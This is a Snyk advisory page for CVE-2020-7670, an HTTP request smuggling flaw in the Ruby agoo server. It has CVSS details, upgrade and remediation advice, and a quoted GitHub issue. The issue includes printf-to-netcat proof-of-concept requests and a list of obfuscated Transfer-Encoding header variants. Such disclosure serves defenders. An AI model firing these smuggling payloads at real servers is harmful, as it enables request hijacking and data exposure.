### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)

#### Introduced: 3 Jun 2020

[CVE-2020-7670  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2020-7670) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-200  (opens in a new tab)](https://cwe.mitre.org/data/definitions/200.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `agoo` to version 2.14.0 or higher.

## Overview

[agoo](https://rubygems.org/gems/agoo) is a fast HTTP server supporting rack.

Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Content-Length and Transfer encoding header parsing.

It is possible to conduct HTTP request smuggling attacks where `agoo` is used as part of a chain of backend servers due to insufficient `Content-Length` and `Transfer Encoding` parsing.

### CVSS Scores

version 3.1
### Snyk

5.9 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**

# Vulnerability Disclosure

We at Snyk value the security community and believe that a responsible disclosure of security vulnerabilities in open source packages helps us ensure the security and privacy of the users. We aim to provide a disclosure program for the security community to report security issues found within languages including JavaScript, Java, Python, .NET, Go, Ruby and PHP.

Using this form, you can disclose vulnerabilities you’ve found or vulnerabilities that are missing within [Snyk Vulnerability Database](https://security.snyk.io/), and we’ll help you verify the vulnerability and contact the maintainer. In addition, as a CVE Numbering Authority (CNA) we are also able to assign a CVE for the issue.

Before submitting a report, please review our disclosure policy which can be found [here](https://docs.snyk.io/disclosing-vulnerabilities/disclose-a-vulnerability-in-an-open-source-package).

For any questions or follow ups on the disclosure you may email us at report@snyk.io.

## Description

![@ohler55](https://avatars.githubusercontent.com/u/118856?u=c9a1585bec9895d5cbe167ce2780362612ca7aac&v=4&size=48)[ohler55](https://github.com/ohler55)opened [on May 16, 2020](https://github.com/ohler55/agoo/issues/88#issue-619332166)

Testbed used to verify the vulnerability: <https://github.com/ohler55/agoo#rack>

The following requests can be send via command line (tested on ubuntu) to reproduce the behaviour

## Double Content Length Headers

printf 'GET /hello HTTP/1.1\r\n'

'Content-Length: 47\r\n'

'Content-Length: 0\r\n'

'Host: 127.0.0.1\r\n'

'\r\n'

'GET /smuggle HTTP/1.1\r\n'

'Host: 127.0.0.1\r\n'

'\r\n' | nc 127.0.0.1 80

### Invalid Transfer Encoding Header

printf 'POST / HTTP/1.1\r\n'

'Host:localhost\r\n'

'tRANSFER-ENCODING: chunked\r\n'

'Content-Type: application/x-www-form-urlencoded\r\n'

'\r\n'

'0\r\n'

'\r\n'

| nc 127.0.0.1 80

## Agoo allows multiple malformed variations of the Transfer Encoding header

A request with Content Length and malformed Transfer encoding headers that can be sent to a backend server and conduct CL:TE attacks. (<https://memn0ps.github.io/2019/09/13/HTTP-Request-Smuggling-CL-TE.html>)

POST /hello HTTP/1.1

Host: 127.0.0.1:6464

Content-Type: application/x-www-form-urlencoded

Content-Length: 6

Transfer-Encoding : chunked

0

X

In the above example, the request is sent with the Transfer encoding header having extra spaces (Transfer-Encoding : chunked). This is in violation of RFC 7230. Agoo was also found to allow multiple variations of bad transfer encoding headers including CRLF characters, Fake Transfer encoding etc. (See TE.TE behavior: obfuscating the TE header section: <https://portswigger.net/web-security/request-smuggling>)

Some other examples that is allowed:

Transfer-Encoding: chunk

Transfer-Encoding: ch–nked

Transfer-Encoding:ÿchunked

Transfer-Encoding:chunked

tRANSFER-ENCODING: chunked

[space here]Transfer-Encoding: chunked

Transfer-Encoding: chunked

Transfer-Encoding:chunked

Transfer-Encoding: "chunked"

Transfer-Encoding

: chunked

Transfer-Encoding: chunked

The above is proof of concept which just demonstrates the behaviour. Depending on how Algoo will be used as part of a chain of servers, this could result in a successful request smuggling attack. I am happy to provide more information regarding a successful attack.

Remediation

The best solution to remediate this vulnerability is to do the following:

* Disallow requests with double content lengths headers
* Ensure malformed Transfer encoding headers are not allowed. This can be done via rejecting the request and sending a 400 back to the HTTP client
* As per RFC 7230, (<https://tools.ietf.org/html/rfc7230#section-3.3.3>) When requests with both Content-Length and Transfer encoding header is sent, the Content-Length header should be ignored

Remediation for the following open source projects can be used as a reference. The above points were taken from that.
